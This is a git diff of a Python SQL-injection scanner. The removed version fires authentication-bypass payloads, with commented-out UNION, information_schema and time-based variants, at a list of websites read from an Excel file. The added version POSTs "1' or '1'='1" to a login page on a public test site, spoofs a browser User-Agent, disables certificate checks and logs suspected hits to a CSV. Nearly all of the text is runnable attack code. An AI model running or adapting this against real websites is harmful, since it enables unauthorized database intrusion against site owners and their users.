@@ -1,47 +1,49 @@
-import pandas as pd
 import requests
+import csv
 
-# Read the Excel file containing the list of websites
-df = pd.read_excel('Website.xlsx')
-#mdf = df[11:31]
-# List of payloads to try
-payloads = [
-    "' OR '1'='1'--",
-     #"' OR '1'='1' /*",
-   # "1' UNION SELECT null, database(), null--",
-    #"1' UNION SELECT table_name, column_name, null FROM information_schema.columns--",
-    #"1'; SELECT 1/0; --",
-    #"1'; SELECT * FROM nonexistent_table; --",
-    #"1' AND 1=1--",
-    #"1' AND 1=2--",
-    #"1' AND SLEEP(5)--"
-    
+# List of website URLs
+websites = [
+    'http://testphp.vulnweb.com/login.php',
+    # Add more URLs as needed
 ]
 
-# List to store the results
+# Payload for injection attack (assuming it's a SQL injection)
+payload = "1' or '1'='1"
+
+# Headers
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+}
+
+# List to store results
 results = []
 
-# Iterate over the rows of the DataFrame
-for index, row in df.iterrows():
-    website = row['Website']
-    status = 'Not Vulnerable'
+# Iterate over the list of websites
+for url in websites:
+    try:
+        # Send a POST request with the payload
+        response = requests.post(url, data={'username': payload, 'password': payload}, headers=headers, timeout=10, verify=False)
 
-    # Iterate over the columns 1 to 10 or up to the number of columns in the row
-    for col in range(10, min(22, len(row))):
-        value = str(row[col])
+        # Check the response for common signs of a successful injection
+        if 'error' in response.text.lower() or 'exception' in response.text.lower() or response.status_code != 200:
+            status = 'Possible SQL injection detected'
+        else:
+            status = 'No injection detected'
+        
+        # Append result to the list
+        results.append({'Website': url, 'Status': status})
+        
+    except requests.RequestException as e:
+        status = f'Error occurred: {e}'
+        results.append({'Website': url, 'Status': status})
 
-        # Iterate over the payloads
-        for payload in payloads:
-            url = f'{website}?username=admin&password={value}{payload}'
-            response = requests.get(url)
-            if 'error' in response.text.lower():
-                status = 'Vulnerable'
-                break  # No need to test other payloads if vulnerability is found
+# Write results to CSV file
+with open('sql results.csv', 'w', newline='') as csvfile:
+    fieldnames = ['Website', 'Status']
+    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
 
-    results.append({'Website': website, 'Status': status})
+    writer.writeheader()
+    for result in results:
+        writer.writerow(result)
 
-# Create a new DataFrame from the results
-results_df = pd.DataFrame(results)
-
-# Write the results to a new Excel file
-results_df.to_excel('results.xlsx', index=False)
+print('Results saved to results.csv')
